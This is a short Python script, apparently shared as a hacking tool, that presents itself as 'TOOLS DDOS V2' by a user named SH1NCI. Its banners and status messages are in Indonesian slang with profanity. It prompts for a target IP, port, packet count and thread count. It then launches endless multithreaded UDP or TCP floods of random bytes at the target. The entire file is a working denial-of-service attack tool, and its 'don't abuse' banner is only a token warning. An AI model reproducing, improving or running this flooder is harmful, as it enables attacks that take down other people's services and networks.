#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print(" ==> ################################### <==  \n")
print(" ==> ### TOOLS DDOS V2 BY SH1NCI ### <==  \n")
print(" ==> ################################### <==  \n")
print(" ==> ### AWAS YO JANGAN ABUSE NGENTOD ##### <==  \n")
print(" ==> ################################### <==  \n")

ip = str(input("  Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Gas Attack?(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PUNTEN MAMANK SH1NCI NIH ")
		except:
			print("[!] GAGAL !!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PUNTEN MAMANK SH1NCI NIH ")
		except:
			s.close()
			print("[*] GAGAL !!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()